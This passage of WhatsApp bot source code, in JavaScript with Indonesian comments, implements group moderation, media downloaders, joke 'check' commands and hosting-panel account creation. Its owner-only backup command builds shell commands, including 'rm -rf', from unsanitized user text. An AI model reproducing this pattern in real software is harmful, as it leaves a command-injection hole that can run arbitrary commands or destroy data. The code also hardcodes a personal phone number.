            media = await Izz.downloadAndSaveMediaMessage(quoted); // Unduh media gambar
            mem = await uptotelegra(media); // Upload ke server telegra.ph
            await Izz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] }); // Kirim pesan gambar
            await sleep(text.split('|')[1]); // Tunggu sesuai waktu yang ditentukan
        } else {
            await Izz.sendMessage(xnxx, { text: text.split('|')[0] }); // Kirim pesan teks
            await sleep(text.split('|')[1]); // Tunggu sesuai waktu yang ditentukan
        }
    }
    await m.reply(`Success`);
}
break
case 'setnamabot': {
const ownerNumber = '6281274749995'; // Nomor owner utama yang tidak akan dihapus

    // Pastikan hanya owner utama yang dapat menjalankan case ini
    if (m.sender.split('@')[0] !== ownerNumber) {
        reply("Hanya owner utama yang dapat menjalankan perintah ini.");
        return;
    }
if (!text) return m.reply(`Contoh: ${prefix+command} Izz`)
await Izz.updateProfileName(text)
await m.reply(`Sukses mengganti nama bot!`)
}
break
case 'setbiobot': {
const ownerNumber = '6281274749995'; // Nomor owner utama yang tidak akan dihapus

    // Pastikan hanya owner utama yang dapat menjalankan case ini
    if (m.sender.split('@')[0] !== ownerNumber) {
        reply("Hanya owner utama yang dapat menjalankan perintah ini.");
        return;
    }
if (!isOwner) return m.reply(`only izz`) 
if (!text) return m.reply(`Contoh: ${prefix+command} aktif`)
await Izz.updateProfileStatus(text)
await m.reply(`Sukses mengganti bio bot!`)
}
break
case 'backup':
 {
    const ownerNumber = '6281274749995'; // Nomor owner utama yang tidak akan dihapus

    // Pastikan hanya owner utama yang dapat menjalankan case ini
    if (m.sender.split('@')[0] !== ownerNumber) {
        reply("Hanya owner utama yang dapat menjalankan perintah ini.");
        return;
    }
 if (!isOwner) return m.reply(mess.owner)
 if (!text) return m.reply(`\n\n*Format Salah*\nSilahkan Masukkan .*backup* nama file\n\n`);
 await m.reply("Sabar Mas Lagi Backup!!!");
 const { execSync } = require("child_process");
 const ls = (await execSync("ls"))
 .toString()
 .split("\n")
 .filter(
 (pe) =>
 pe != "node_modules" &&
 pe != "karzsession" &&
 pe != "package-lock.json" &&
 pe != "yarn.lock" &&
 pe != ""
 );
 const exec = await execSync(`zip -r ${text}.zip ${ls.join(" ")}`);
 await Izz.sendMessage(
 m.chat,
 {
 document: await fs.readFileSync(`./${text}.zip`),
 mimetype: "application/zip",
 fileName: `${text}.zip`,
 },
 { quoted: qchanel }
 );
 await execSync(`rm -rf ${text}.zip`);
 }
 break
 case "add":{
 
if (!m.isGroup) return m.reply(`Khusus Group`)
if (!isOwner) return m.reply(`Only owner`)
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Izz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{

if (!m.isGroup) return m.reply(`Khusus Group`)
if (!isOwner) return m.reply(`Only owner`)
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Izz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break

case 'editinfo': {

if (!m.isGroup) return m.reply(mess.group)
if (!isOwner) return m.reply(`Only owner`)
 if (args[0] === 'open'){
await Izz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m?.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m?.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await Izz.groupSettingUpdate(m.chat, 'locked').then((res) => m?.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m?.reply(jsonformat(err)))
 } else {
 m?.reply(`Silahkan Ketik ${prefix + command} open/ ${prefix + command} close`)
}
}
break
case 'hidetag': {

if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Teks Nya Mana Kak?`)
Izz.sendMessage(m.chat, {
    text: q,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: 'anjay'
        }]
    }
})}
break
case 'demote': {

if (!isOwner) return ('only owner') 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Izz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break
case "promote": case "promot": {

if (!isGroup && !isOwner) return (mess.only.owner)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Izz.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))

console.log(chalk.red.bold('sukses mengirim'))

}
break
case 'gc': { 

if (!m.isGroup) return m.reply(`Khusus Group`)
if (!isOwner) return m.reply(`Only owner`)
if (args[0] === 'close'){
await Izz.groupSettingUpdate(m.chat, 'announcement').then((res) => m?.reply(`Sukses Menutup Group`)).catch((err) => m?.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await Izz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m?.reply(`Sukses Membuka Group`)).catch((err) => m?.reply(jsonformat(err)))
} else {
 m?.reply(`Silahkan Ketik ${prefix + command} open/ ${prefix + command} close`)
 }
}
break
case 'del': case 'delete': {

if (!m.isOwner) {
if (!isOwner) return reply(mess.only.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (!isOwner) return (mess.owner) 
Izz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case 'tourl': {
    if (!m.quoted) return reply("❌ *Reply file atau gambar yang mau di-upload!*");

    let mime = m.quoted.mimetype || "";
    if (!/image|video|audio|document/.test(mime)) return reply("❌ *Format file tidak didukung!*");

    let media = await Izz.downloadAndSaveMediaMessage(m.quoted);
    let form = new FormData();
    form.append('file', fs.createReadStream(media));

    try {
        let { data } = await axios.post('https://cloudkuimages.xyz/upload', form, {
            headers: { ...form.getHeaders() }
        });

        if (data.status === 'success') {
            reply(`✅ *File berhasil diunggah!*\n📎 *URL:* ${data.file_url}`);
        } else {
            reply(`❌ *Gagal upload!* ${data.message}`);
        }
    } catch (err) {
        console.error("❌ Error upload:", err);
        reply("❌ *Terjadi kesalahan saat upload! Coba lagi nanti.*");
    }

    fs.unlinkSync(media);
}
break;
break
case 'toimage':
            case 'toimg': {
            
            
            if (!isOwner) return (`only owner`) 
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply('```Waitt Sedang Kami Proses...```')
                let media = await Izz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    Izz.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
case 'stiker':
case 'sticker': {

if (!isOwner) return (`only owner`) 
if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
Izz.sendMessage(from, {react: {text: "🔎", key: m.key}})
if (/image/.test(mime)) {
let media = await Izz.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Izz.imgToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 25) return m.reply('Maksimal 25 detik!')
let media = await Izz.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Izz.vidToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await Izz.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Izz.sendStickerFromUrl(m.chat, media, m, {packname: `` , author: author })
await fs.unlinkSync(media)
} else m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
}
break
case 'mediafire': {
    if (!text) return m.reply(`Contoh: ${prefix+command} <link_mediafire>`);
    m.reply("⏳ Sedang memproses link MediaFire...");

    try {
        let url = `https://fastrestapis.fasturl.cloud/downup/mediafiredown?url=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        if (json.status !== 200 || !json.result) {
            return m.reply("❌ Gagal mengambil data download. Mungkin link salah atau server error.");
        }

        let { download, filename, size, mimetype } = json.result;
        if (!download || !filename) {
            return m.reply("❌ Data tidak lengkap (download link atau filename tidak ditemukan).");
        }

        // Kirim info singkat
        let caption = `*MediaFire Downloader*\n\n` +
                      `• *Filename* : ${filename}\n` +
                      `• *Size* : ${size}\n` +
                      `• *Mimetype* : ${mimetype}\n` +
                      `• *Link Download* : ${download}\n\n` +
                      `_Mengirim file..._`;
        await Izz.sendMessage(m.chat, { text: caption }, { quoted: m });

        // Pengiriman file, cek mimetype atau ekstensi
        let lowerMime = (mimetype || '').toLowerCase();

        if (lowerMime.startsWith('image/')) {
            // Jika gambar
            await Izz.sendMessage(m.chat, {
                image: { url: download },
                caption: `File: ${filename}`
            }, { quoted: m });
        } else if (lowerMime.startsWith('video/')) {
            // Jika video
            await Izz.sendMessage(m.chat, {
                video: { url: download },
                caption: `File: ${filename}`
            }, { quoted: m });
        } else if (lowerMime.startsWith('audio/')) {
            // Jika audio
            await Izz.sendMessage(m.chat, {
                audio: { url: download },
                mimetype: lowerMime,
                fileName: filename
            }, { quoted: m });
        } else {
            // Selain itu, fallback kirim dokumen
            await Izz.sendMessage(m.chat, {
                document: { url: download },
                fileName: filename,
                mimetype: mimetype || 'application/octet-stream'
            }, { quoted: m });
        }

        m.reply("✅ File berhasil dikirim!");
    } catch (err) {
        console.error("Error MediaFire:", err);
        m.reply("❌ Terjadi kesalahan saat memproses link MediaFire.");
    }
}
break

case 'tt':
case 'ttdl':
case 'tiktok': {

if (!isOwner) return (`only owner abangkuh`);
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
Izz.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let jir = await fetchJson(`https://skizo.tech/api/tiktok?apikey=${skizapi}&url=${text}`)
let sil = `${jir.media}`
return await Izz.sendMessage(m.chat, { video: { url: sil }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let anu = await Downloader(text, { version: "v2" })
if (anu.result.type === 'video') return await Izz.sendMessage(m.chat, { video: { url: anu.result.video }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await Izz.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await Izz.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v2:', err)
try {
let anu = await Downloader(text, { version: "v1" })
if (anu.result.type === 'video') return await Izz.sendMessage(m.chat, { video: { url: anu.result.video.playAddr }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await Izz.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await Izz.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v1:', err)
try {
let anu = await Downloader(text, { version: "v3" })
if (anu.result.type === 'video') return await Izz.sendMessage(m.chat, { video: { url: anu.result.video2 }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await Izz.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await Izz.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v3:', err)
try {
const data = await tiktokdl(text)
console.log(data)
return await Izz.sendMessage(m.chat, { video: { url: data.video }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada tiktokdl:', err)
try {
let maximus = await api.ttdl(text)
let caption = `© ${wm}`
return await Izz.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
} catch (err) {
console.error('Kesalahan pada api.ttdl:', err)
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type === "nowatermark") {
return await Izz.sendMessage(m.chat, { video: { url: imgs.url }, caption: `© ${wm}` }, { quoted: m })
} else if (imgs.type === "photo") {
if (c === 0) await Izz.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di private chat' : ""}` }, { quoted: m })
else await Izz.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}}
} catch (err) {
console.error('Kesalahan pada API vreden:', err)
m.reply('Terjadi kesalahan')
}}}
}}}
}}
break
case 'play': {
    if (args.length === 0) return Izz.sendMessage(m.chat, { text: `Ketikkan nama lagu atau URL YouTube, misalnya:\nplay dj kane` }, { quoted: m });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return Izz.sendMessage(m.chat, { text: 'Lagu yang Anda cari tidak ditemukan.' }, { quoted: m });

        const video = search.all[0];
        const detail = `*Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}
_Proses pengunduhan audio..._`;

        await Izz.sendMessage(m.chat, { text: detail }, { quoted: m });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return Izz.sendMessage(m.chat, { text: 'Gagal mengunduh audio.' }, { quoted: m });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                await Izz.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: m });
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        Izz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mencoba mengunduh audio.' }, { quoted: m });
    }
}
break
    case 'sound': {
    
    if (!isOwner) return m.reply(`khusus owner`);
 const query = m.text.slice(16).trim(); // Mengambil query pencarian setelah perintah
 if (!query) {
 m.reply("Silakan masukkan judul lagu yang ingin dicari.");
 return;
 }

 const axios = require('axios');
 
 const scrapeSoundCloud = async (query) => {
 try {
 const url = `https://m.soundcloud.com/search?q=${encodeURIComponent(query)}`;
 const { data } = await axios.get(url);
 
 const $ = cheerio.load(data);
 
 let results = [];
 
 // Cari elemen dengan struktur yang sesuai
 $('.List_VerticalList__2uQYU li').each((index, element) => {
 const title = $(element).find('.Cell_CellLink__3yLVS').attr('aria-label');
 const musicUrl = 'https://m.soundcloud.com' + $(element).find('.Cell_CellLink__3yLVS').attr('href');
 
 if (title && musicUrl) {
 results.push({ title, url: musicUrl });
 }
 });

 return results;
 } catch (error) {
 console.error('Error fetching SoundCloud data:', error);
 return [];
 }
 };

 const main = async () => {
 try {
 const results = await scrapeSoundCloud(query);
 if (results.length === 0) {
 m.reply("Tidak ada hasil ditemukan.");
 } else {
 const message = results.map(result => `${result.title}\n${result.url}`).join('\n\n');
 m.reply(message);
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mencari lagu.");
 }
 };

 main();
}
break
///////////
case 'cekkodam':
case  'cekkhodam':{

    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        name = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Singa",
  "kosoong atau tidak ada",
  "Harimau",
  "Elang",
  "Serigala",
  "Naga",
  "Gajah",
  "Kuda",
  "Macan Tutul",
  "Kerbau",
  "Burung Hantu",
  "Burung Rajawali",
  "Ikan Hiu",
  "Lumba-Lumba",
  "Ular",
  "Kura-Kura",
  "Tupai",
  "Paus",
  "Kelelawar",
  "Kijang",
  "Banteng",
  "Rusa",
  "Anjing",
  "Kucing",
  "Buaya",
  "Kambing",
  "Kuda Nil",
  "Bebek",
  "Angsa",
  "Ayam",
  "Merpati",
  "Burung Beo",
  "Burung Kenari",
  "Burung Kakatua",
  "Bunglon",
  "Cicak",
  "Kodok",
  "Katak",
  "Tikus",
  "Landak",
  "Kanguru",
  "Koala",
  "Panda",
  "Beruang",
  "Rubah",
  "Lynx",
  "Leopard",
  "Jaguar",
  "Cheetah",
  "Badak",
  "Zebra",
  "Antelop",
  "Unta",
  "Alpaka",
  "Llama",
  "Serigala Abu-abu",
  "Serigala Merah",
  "Serigala Putih",
  "Lynx",
  "Harimau Putih",
  "Harimau Siberia",
  "Harimau Sumatra",
  "Gorila",
  "Orangutan",
  "Simpanse",
  "Monyet",
  "Babun",
  "Lemur",
  "Iguana",
  "Komodo",
  "Salamander",
  "Belut",
  "Sotong",
  "Gurita",
  "Kepiting",
  "Lobster",
  "Udang",
  "Kupu-kupu",
  "Lebah",
  "Tawon",
  "Kumbang",
  "Belalang",
  "Jangkrik",
  "Semut",
  "Kecoak",
  "Laba-laba",
  "Kalajengking",
  "Serangga Tongkat",
  "Naga Laut",
  "Kuda Laut",
  "Duyung",
  "Putri Duyung",
  "Burung Kolibri",
  "Burung Hantu Salju",
  "Burung Puyuh",
  "Burung Gagak",
  "Burung Pelikan",
  "Burung Albatros",
  "Burung Flamingo",
  "Burung Hering",
  "Burung Camar",
  "Burung Pinguin",
    "Cincin",
    "Batu Akik",
    "Keris",
    "Tongkat",
    "Pusaka",
    "Patung",
    "Mustika",
    "Tasbih",
    "Kalung",
    "Gelang",
    "Permata",
    "Pedang",
    "Mata Uang",
    "Wesi Kuning",
    "Serat Tali",
    "Belati",
    "Cundrik",
    "Selendang",
    "Jarum",
    "Tombak",
    "Kerikil",
    "Kendi",
    "Kain Kafan",
    "Topi",
    "Payung",
    "Sandal",
    "Kacamata",
    "Sabuk",
    "Sarung",
    "Tali Ikat Pinggang",
    "Surat",
    "Kunci",
    "Lilin",
    "Peniti",
    "Sisir",
    "Cermin",
    "Kendi Air",
    "Piring",
    "Gelas",
    "Mangkuk",
    "Sendok",
    "Sapu",
    "Gayung",
    "Tikar",
    "Bantal",
    "Guci",
    "Lentera",
    "Lampu",
    "Buku",
    "Pena",
    "Dupa",
    "Asbak",
    "Cangkir",
    "Gantungan Kunci",
    "Kalender",
    "Sepeda",
    "Lukisan",
    "Batu Kerikil",
    "Batu Kali",
    "Kipas",
    "Peci",
    "Sorban",
    "Rokok",
    "Topeng",
    "Gamelan",
    "Angklung",
    "Suling",
    "Wayang",
    "Kuda-Kudaan",
    "Sepatu",
    "Jam Tangan",
    "Kosong atau tidak adaa"
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Khodam ${lana} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    


    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        m.reply(text)
        if (res) {
await Izz.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
        }
    }
};
break
case 'gantengcek':
case 'cekganteng': {

if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
m.reply(`Nama : ${q}\nJawaban : *${teng}%`)
}
break
case 'cantikcek':
case 'cekcantik': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
m.reply(`Nama : ${q}\nJawaban : *${tik}%`)
}
break
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'lesbicek':
case 'ceklesbi': {

if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'bisakah': {
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case "ai":{
if (!text) return m?.reply("mau nanya apa sama Izz")
let gemini = await axios.get("https://bk9.fun/ai/gemini?q=" + text)
m?.reply(gemini.data.BK9)
}
break
case 'chatbot': {
if (!isOwner) return m.reply(`khusus Owner izz`);
const GptNumber = '18772241042@s.whatsapp.net';
if (!text) {
return reply("Silakan masukkan pesan yang ingin dikirim.");
}
await Izz.sendMessage(GptNumber, {
text: text
});
if (global.responseListener) {
Izz.ev.off('messages.upsert', global.responseListener);
}
global.responseListener = async (msg) => {
if (
msg.messages[0].key.remoteJid === GptNumber && 
msg.messages[0].message?.conversation
) {
const response = msg.messages[0].message.conversation;
await Izz.sendMessage(m.chat, {
text: `${response}`
});
}
};
Izz.ev.on('messages.upsert', global.responseListener);
}
break
case 'delakses': {

    if (!isOwner) return m.reply(`Khusus owner`);
    let nomor, role;

    // Tangani mention, balasan, atau input manual
    if (m.mentionedJid && m.mentionedJid.length > 0) {
        // Jika ada mention (@nama)
        nomor = m.mentionedJid[0];
        role = args[1]?.toLowerCase();
    } else if (m.quoted) {
        // Jika membalas pesan
        nomor = m.quoted.sender;
        role = args[0]?.toLowerCase();
    } else if (args.length === 2) {
        // Jika menggunakan format .delakses nomor,role
        nomor = args[0] + '@s.whatsapp.net';
        role = args[1]?.toLowerCase();
    } else {
        return reply('Format salah! Gunakan format:\n1. Balas pesan dengan .delakses role\n2. Ketik .delakses nomor,role\n3. Mention nomor dengan .delakses @nama,role');
    }

    // Validasi nomor
    if (!nomor) {
        return reply('Nomor tidak ditemukan. Harap balas pesan, mention, atau gunakan format: .delakses nomor,role');
    }

    // Validasi role
    if (!['owner', 'asisten', 'prem'].includes(role)) {
        return reply('Role tidak valid! Silakan pilih salah satu: owner, asisten, atau prem.');
    }

    // File database berdasarkan role
    let filePath;
    if (role === 'owner') filePath = './save/database/owner.json';
    else if (role === 'asisten') filePath = './save/database/asisten.json';
    else if (role === 'prem') filePath = './save/database/premium.json';

    // Hapus nomor dari file role
    const roleDatabase = JSON.parse(fs.readFileSync(filePath));

    if (role === 'prem') {
        // Format untuk premium adalah array dengan format ["number@s.whatsapp.net"]
        const index = roleDatabase.indexOf(nomor);
        if (index !== -1) {
            roleDatabase.splice(index, 1); // Hapus nomor
            fs.writeFileSync(filePath, JSON.stringify(roleDatabase, null, 2));
        } else {
            return reply(`Nomor ${nomor} tidak ditemukan dalam database ${role}.`);
        }
    } else {
        // Untuk owner dan asisten, gunakan format biasa
        const plainNumber = nomor.split('@')[0]; // Hapus domain jika ada
        const index = roleDatabase.indexOf(plainNumber);
        if (index !== -1) {
            roleDatabase.splice(index, 1); // Hapus nomor
            fs.writeFileSync(filePath, JSON.stringify(roleDatabase, null, 2));
        } else {
            return reply(`Nomor ${plainNumber} tidak ditemukan dalam database ${role}.`);
        }
    }

    // Hapus nomor dari allowed.json
    const allowedPath = './save/database/allowed.json';
    const allowedDatabase = JSON.parse(fs.readFileSync(allowedPath));
    const plainNumber = nomor.split('@')[0]; // Hapus domain untuk format allowed
    const allowedIndex = allowedDatabase.indexOf(plainNumber);
    if (allowedIndex !== -1) {
        allowedDatabase.splice(allowedIndex, 1); // Hapus nomor
        fs.writeFileSync(allowedPath, JSON.stringify(allowedDatabase, null, 2));
    }

    // Kirim konfirmasi
    reply(`Berhasil menghapus nomor ${nomor} dari ${role} dan database allowed.`);
}
break
case "1gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "1GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "1024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "1024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
